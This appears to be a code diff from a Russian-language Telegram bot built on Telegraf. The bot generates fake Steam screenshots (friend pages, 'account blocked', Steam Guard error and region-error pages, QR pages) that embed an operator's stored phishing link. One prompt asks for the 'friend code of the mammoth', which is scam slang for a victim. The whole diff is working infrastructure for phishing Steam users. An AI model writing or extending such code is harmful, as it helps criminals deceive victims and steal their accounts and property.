+    await ctx.answerCbQuery().catch(() => null);
+    return;
+  }
+
+  if (data === "draw:add_friend") {
     const base = data.split(":")[1];
     await replaceOrReply(
       ctx,
@@ -2265,14 +2628,14 @@ bot.on("callback_query", async (ctx, next) => {
   if (data.startsWith("draw:add_friend:") || data.startsWith("draw:acc_blocked:") || data.startsWith("draw:steam_guard_error:")) {
     const parts = data.split(":");
     const mode = `${parts[0]}:${parts[1]}`.replace("draw:", "");
-    const variant = parts[2] === "id" ? "id" : "link";
+    const variant = mode === "acc_blocked" || mode === "steam_guard_error" || parts[2] === "id" ? "id" : "link";
     state.set(ctx.from.id, {
       mode: `draw_input:${mode}` as any,
       payload: { variant, promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
     });
     await replaceOrReply(ctx, `<b>Пришлите ссылку на профиль или SteamID.</b>`, {
       parse_mode: "HTML",
-      reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", data.replace(`:${variant}`, ""))]]).reply_markup,
+      reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", `draw:${mode}`)]]).reply_markup,
     });
     await ctx.answerCbQuery().catch(() => null);
     return;
@@ -2353,11 +2716,16 @@ bot.on("callback_query", async (ctx, next) => {
   }
 
   if (data === "draw:qr_page") {
+    const phishingLink = await getRequiredPhishingLink(ctx, me);
+    if (!phishingLink) {
+      await ctx.answerCbQuery().catch(() => null);
+      return;
+    }
     state.set(ctx.from.id, {
-      mode: "draw_input:qr_page_link",
-      payload: { promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
+      mode: "draw_input:qr_page_time",
+      payload: { inviteLink: phishingLink, promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
     });
-    await replaceOrReply(ctx, `<b>Введите фишинг-ссылку.</b>`, {
+    await replaceOrReply(ctx, `<b>Введите время для скриншота.</b>`, {
       parse_mode: "HTML",
       reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "draw:menu")]]).reply_markup,
     });
@@ -2377,16 +2745,48 @@ bot.on("callback_query", async (ctx, next) => {
     return;
   }
 
-  if (data.startsWith("draw:friend_page:")) {
-    const variant = data.endsWith(":not_found") ? "not_found" : "normal";
-    state.set(ctx.from.id, {
-      mode: "draw_input:friend_page",
-      payload: { variant, promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
-    });
-    await replaceOrReply(ctx, `<b>Введите фишинг-ссылку.</b>`, {
+  if (data === "draw:friend_page:not_found") {
+    await replaceOrReply(ctx, `<b>Выберите режим.</b>`, {
       parse_mode: "HTML",
-      reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "draw:friend_page")]]).reply_markup,
+      reply_markup: Markup.inlineKeyboard([
+        [
+          Markup.button.callback("✅ Обычный", "draw:friend_page:not_found:plain"),
+          Markup.button.callback("🌍 Ошибка региона", "draw:friend_page:not_found:region_error"),
+        ],
+        [Markup.button.callback("⬅️ Назад", "draw:friend_page")],
+      ]).reply_markup,
     });
+    await ctx.answerCbQuery().catch(() => null);
+    return;
+  }
+
+  if (data.startsWith("draw:friend_page:")) {
+    const variant = data.includes(":not_found:") ? "not_found" : "normal";
+    const showRegionMismatch = data.endsWith(":region_error");
+    const phishingLink = await getRequiredPhishingLink(ctx, me);
+    if (!phishingLink) {
+      await ctx.answerCbQuery().catch(() => null);
+      return;
+    }
+    if (variant === "not_found") {
+      state.set(ctx.from.id, {
+        mode: "draw_input:friend_page_code",
+        payload: { inviteLink: phishingLink, showRegionMismatch, promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
+      });
+      await replaceOrReply(ctx, `<b>Введите код друга мамонта.</b>`, {
+        parse_mode: "HTML",
+        reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "draw:friend_page:not_found")]]).reply_markup,
+      });
+      await ctx.answerCbQuery().catch(() => null);
+      return;
+    }
+    state.delete(ctx.from.id);
+    await ctx.answerCbQuery().catch(() => null);
+    await runDrawJob(
+      ctx,
+      () => makeSteamFriendPageFromTemplateScreenshot(phishingLink, { variant: "normal" }),
+      "Не удалось создать страницу друга.",
+    );
     await ctx.answerCbQuery().catch(() => null);
     return;
   }
